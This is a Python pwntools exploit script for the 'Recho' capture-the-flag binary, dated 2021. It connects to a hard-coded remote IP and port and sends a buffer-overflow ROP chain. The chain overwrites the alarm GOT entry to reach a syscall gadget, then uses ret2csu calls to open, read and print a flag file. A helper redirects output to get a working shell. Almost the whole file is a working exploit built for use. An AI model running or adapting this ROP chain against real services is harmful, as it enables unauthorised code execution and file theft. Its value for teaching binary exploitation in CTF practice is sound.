# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './Recho'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '111.200.241.244'
    port = '60398'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def csu( call_addr ,rdi , rsi , rdx):
    pop_rbx_r15_ret = 0x40089A
    mov_call = 0x400880
    arg = flat(
        0 , 1 , call_addr,
        rdx , rsi , rdi,
    )
    return flat(pop_rbx_r15_ret , arg , mov_call) 

# one_gad = one_gadget(libc.path)

def attack():
    
    # 这题虽然限制条件很多，但是 gadget 却几乎全给了
    # 这题 ida 不能全信，有些奇奇怪怪的 gadget 可能识别不出来
    # 这题我觉的质量挺高的

    bss_addr = elf.bss(0x100)
    flag_addr = 0x601058
    add_rdi_al_ret = 0x40070d
    # [rdi]
    pop_rax_ret = 0x4006FC
    pop_rdi_ret = 0x4008a3

    read_got = elf.got['read']
    alarm_got = elf.got['alarm']
    printf_got = elf.got['printf']

    sla('server!','999')

    payload  = 'a'*0x38
    payload += flat(pop_rax_ret , 5 , pop_rdi_ret , alarm_got , add_rdi_al_ret)
    payload += flat(pop_rax_ret , 2)
    payload += csu(alarm_got , flag_addr , 0 , 0)
    payload += csu(read_got , 3 , bss_addr ,0x100 )
    payload += csu(printf_got , bss_addr , 0 ,0 )


    # dbg('*0x0000000000400809')
    se( payload )
    
    p.shutdown()
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   Recho.py
@Time    :   2021/12/10 20:56:29
@Author  :   Niyah 
'''